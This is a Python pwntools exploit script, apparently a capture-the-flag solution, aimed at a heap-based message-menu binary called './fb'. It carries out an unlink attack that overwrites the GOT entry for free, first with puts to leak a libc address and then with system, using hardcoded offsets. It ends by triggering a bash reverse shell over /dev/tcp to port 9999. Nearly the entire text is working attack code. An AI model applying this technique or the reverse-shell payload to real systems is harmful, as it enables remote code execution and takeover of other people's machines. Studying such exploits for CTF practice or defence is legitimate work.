#!/usr/bin/python
# -*- coding: utf-8 -*-
 
from pwn import *

#p = remote('192.168.0.8',8888)
p = process('./fb') 

def InitMsg(len):
    p.sendline("1")
    p.recv()
    p.sendline(str(len))
    p.recv()

def SetMsg(Id, Msg):
    p.sendline("2")
    p.recv()
    p.sendline(str(Id))
    p.recv()
    p.send(Msg)
    p.recv()

def DelMsg(Id):
    p.sendline("3")
    p.recv()
    p.sendline(str(Id))
    p.recv()


def ShowMsg(Id):
    p.sendline("4")
    p.recv()


def WriteAddr(Addr, Value):
    Msg = 'B'*0x18
    Msg += p64(0x6020c8)+p64(0x80)
    Msg += 'B'*0x10
    Msg += p64(Addr)
    Msg += '\x80\x0A'
    SetMsg(2, Msg)
    Msg = Value
    Msg += chr(0xa)
    SetMsg(4, Msg)

def ReadAddr(Addr):
    Msg = 'B'*0x18
    Msg += p64(0x6020c8)+p64(0x80)
    Msg += 'B'*0x10
    Msg += p64(Addr)
    Msg += '\x80\x0A'
    SetMsg(2, Msg)
    # DelMsg(4)
    p.sendline("3")
    p.recv()
    p.sendline('4')    
    ret = p.recv()
    # print ret[-104:]
    # print ret[:-104].encode('hex')
    return ret[:-104]

###########################################
#
#start attack
#
###########################################
p.recvuntil("Choice:")
BlockSize = 0xf8
InitMsg(BlockSize)
InitMsg(BlockSize)
InitMsg(BlockSize)
InitMsg(BlockSize)
InitMsg(BlockSize)
InitMsg(BlockSize)

Msg = ""
Msg += p64(0)
Msg += p64(BlockSize-8+1)
Msg += p64(0x6020e0-0x18)
Msg += p64(0x6020e0-0x10)
Msg += 'A'*(BlockSize - 8 - len(Msg))
Msg += p64(0xf0)

Msg += chr(0xa)
SetMsg(2, Msg)
DelMsg(3)
# raw_input("###########################################\nstep1:")
WriteAddr(0x602018, p64(0x4006c0)[:7])  #change free to puts
WriteAddr(0x6020B4, p32(0x100))         #set count to 0x100
# raw_input("###########################################\nstep2:")
puts_addr = ReadAddr(0x602020) + '\x00'*8
puts_addr = u64(puts_addr[:8])
print "puts_addr", hex(puts_addr)

puts_offset   = 0x6a850
system_offset = 0x3f730

system_addr = puts_addr - puts_offset + system_offset
WriteAddr(0x602018, p64(system_addr)[:7])  #change free to system

SetMsg(5, "bash -c 'bash -i > /dev/tcp/127.0.0.1/9999 0>&1'\x00\n")
p.sendline("3")
p.recv()
p.sendline('5')

p.interactive()
